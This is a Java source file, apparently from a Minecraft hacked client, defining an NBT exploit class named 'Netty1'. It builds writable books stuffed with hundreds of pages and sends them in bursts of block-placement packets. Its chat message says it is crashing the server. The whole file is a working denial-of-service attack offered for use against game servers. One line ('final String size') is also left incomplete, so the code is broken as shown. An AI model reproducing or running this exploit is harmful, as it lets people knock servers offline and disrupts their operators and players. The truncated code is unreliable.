package pl.oucik.phecdateam.rebuild.exploit.impl.nbt;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import org.apache.commons.lang3.RandomStringUtils;
import pl.oucik.phecdateam.rebuild.exploit.Exploit;
import pl.oucik.phecdateam.rebuild.exploit.ExploitInfo;
import pl.oucik.phecdateam.rebuild.exploit.ExploitType;
import pl.oucik.phecdateam.rebuild.exploit.argument.Argument;
import pl.oucik.phecdateam.rebuild.helper.ChatHelper;

import java.util.Random;


@ExploitInfo(
    name = "Netty1",
    type = ExploitType.NBT
)
public class Netty1 extends Exploit<ItemStack> {

  public Netty1() {
    super(() -> {
      ItemStack itemStack = new ItemStack(Items.writable_book);
      NBTTagCompound compound = new NBTTagCompound();
      NBTTagList pages = new NBTTagList();

      for (int i = 0; i < 50; i++) {
        pages.appendTag(new NBTTagString(RandomStringUtils.randomAlphabetic(200)));
      }

      compound.setTag("pages", pages);
      itemStack.setTagCompound(compound);
      return itemStack;
    }, new Argument("packets", 0, Integer.class));
  }

  @Override
  public void execute(Object... args) {

    for (int i2 = 0; i2 < 50; ++i2) {
      final ItemStack book = new ItemStack(Items.writable_book);
      final String author = "Netty" + new Random().nextInt(50);
      final String size
      final NBTTagCompound tag = new NBTTagCompound();
      final NBTTagList list = new NBTTagList();
      for (int i3 = 0; i3 < 340; ++i3) {
        final NBTTagString tString = new NBTTagString(size);
        list.appendTag(tString);
      }
      tag.setString("author", author);
      tag.setString("title", "");
      tag.setTag("pages", list);
      if (book.hasTagCompound()) {
        final NBTTagCompound tagb = book.getTagCompound();
        tagb.setTag("pages", list);
      }
      else {
        book.setTagInfo("pages", list);
      }
      Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));

    }
    ChatHelper.printMessage(String.format("&C&LCrashing server with method &4&lNetty1"));
}}
